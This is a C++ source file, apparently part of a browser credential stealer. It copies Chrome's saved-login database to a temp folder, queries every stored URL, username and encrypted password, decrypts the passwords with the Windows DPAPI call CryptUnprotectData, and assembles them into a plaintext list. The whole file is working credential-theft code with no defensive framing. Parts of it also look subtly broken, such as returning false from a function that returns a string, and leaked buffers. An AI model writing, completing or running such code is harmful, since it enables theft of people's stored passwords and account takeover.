
#include "Chrome.h"
#include "sqlite3.h"
#include <Windows.h>
#include <Shlwapi.h>
#include <iostream>
#include <Wincrypt.h>


#pragma comment (lib, "Shlwapi.lib")
#pragma comment(lib, "Crypt32")

#include <cstring>
#include <tchar.h>

using std::string;
using std::wstring;
int nChromePlugin = 0;


#define DATA_FILE_PATH "%APPDATA%\\Temp"

char Data_File_Path[MAX_PATH] = { 0 };

wchar_t * ANSIToUnicode1(const char* str)
{
	int textlen;
	wchar_t * result;
	textlen = MultiByteToWideChar(CP_ACP, 0, str, -1, NULL, 0);
	result = (wchar_t *)malloc((textlen + 1) * sizeof(wchar_t));
	memset(result, 0, (textlen + 1) * sizeof(wchar_t));
	MultiByteToWideChar(CP_ACP, 0, str, -1, (LPWSTR)result, textlen);
	return result;
}

char * UnicodeToUTF81(const wchar_t* str)
{
	char* result;
	int textlen;
	textlen = WideCharToMultiByte(CP_UTF8, 0, str, -1, NULL, 0, NULL, NULL);
	result = (char *)malloc((textlen + 1) * sizeof(char));
	memset(result, 0, sizeof(char) * (textlen + 1));
	WideCharToMultiByte(CP_UTF8, 0, str, -1, result, textlen, NULL, NULL);
	return result;
}



bool SaveToFile1(char * pPathFile, wstring strFile)
{
	FILE *filepath = fopen(pPathFile, "w+");

	if (filepath == NULL)
	{
		return false;
	}
	const wchar_t* strfilew = strFile.c_str();

	string strfileUTF;
	strfileUTF = UnicodeToUTF81(strfilew);

	fwrite(strfileUTF.c_str(), strfileUTF.length(), 1, filepath);

	fclose(filepath);

	return true;
}

wstring ReadEncryptData(const string &sLoginDataPath)
{

	wstring strBuffer = L"";

	string sTempPath;
	if (!CopyDataBaseToTempDir(sLoginDataPath, sTempPath))
		return false;

	sqlite3 *pDB = NULL;
	sqlite3_stmt *pStmt = NULL;
	int nSqliteRet;

	string strSql = "select origin_url, username_value, password_value from logins";
	nSqliteRet = sqlite3_open_v2(sTempPath.c_str(), &pDB, SQLITE_OPEN_READWRITE, NULL);
	if (nSqliteRet != SQLITE_OK)
	{
		sqlite3_close(pDB);
		return false;
	}

	nSqliteRet = sqlite3_prepare_v2(pDB, strSql.c_str(), strSql.length(), &pStmt, NULL);
	if (nSqliteRet != SQLITE_OK)
	{
		sqlite3_finalize(pStmt);
		sqlite3_close(pDB);
		return false;
	}

	do
	{
		nSqliteRet = sqlite3_step(pStmt);
		if (nSqliteRet != SQLITE_ROW)
			break;

		string sOriginUrl;
		string sUsername;
		string sPassword;
		sOriginUrl = (char *)sqlite3_column_text(pStmt, 0);
		sUsername = (CHAR *)sqlite3_column_text(pStmt, 1);
		char*aaa = (char*)sUsername.c_str();
		char*bbb = (char*)sOriginUrl.c_str();


		WCHAR*   strA;
		int i = MultiByteToWideChar(CP_UTF8, 0, aaa, -1, NULL, 0);
		strA = new   WCHAR[i];
		MultiByteToWideChar(CP_UTF8, 0, aaa, -1, strA, i);


		WCHAR *buff1 = new WCHAR[MAX_PATH];
		buff1 = ANSIToUnicode1(bbb);



		DATA_BLOB dbEncryptedVal;
		dbEncryptedVal.cbData = sqlite3_column_bytes(pStmt, 2);
		dbEncryptedVal.pbData = (BYTE*)sqlite3_column_blob(pStmt, 2);

		DATA_BLOB dbOut;
		if (CryptUnprotectData(&dbEncryptedVal, NULL, NULL, NULL, NULL, 0, &dbOut))
		{
			char *pData = new char[dbOut.cbData + 1];
			memcpy(pData, dbOut.pbData, dbOut.cbData);
			pData[dbOut.cbData] = 0;
			sPassword = pData;
			delete[] pData;
		}
		char*ccc = (char*)sPassword.c_str();
		WCHAR *buff2 = new WCHAR[MAX_PATH];
		buff2 = ANSIToUnicode1(ccc);

		wstring databuff;

		databuff += L"Url:";
		databuff += buff1;
		databuff += L"<?>";
		databuff += L"Username:";
		databuff += strA;
		databuff += L"<?>";
		databuff += L"Password:";
		databuff += buff2;
		databuff += L"<?>";
		databuff += L"\r\n";

		strBuffer += databuff;

		delete[]strA;
		delete[]buff1;
		delete[]buff2;



	} while (true);


	//	SaveToFile("c://13.txt", strBuffer);

	if (pStmt)
	{
		sqlite3_finalize(pStmt);
		pStmt = NULL;
	}
	if (pDB)
	{
		sqlite3_close(pDB);
		pDB = NULL;
	}



	return strBuffer;
}

bool CopyDataBaseToTempDir(const std::string &sDBPath, std::string &sTempDBPath)
{
	char chTempPath[MAX_PATH];
	::GetTempPathA(MAX_PATH, chTempPath);
	if (!PathFileExistsA(sDBPath.c_str()))
		return false;

	sTempDBPath = chTempPath;
	if (sTempDBPath.empty())
		return false;

	sTempDBPath.append("chromeTmp");
	if (!CopyFileA(sDBPath.c_str(), sTempDBPath.c_str(), FALSE))
		return false;

	return true;
}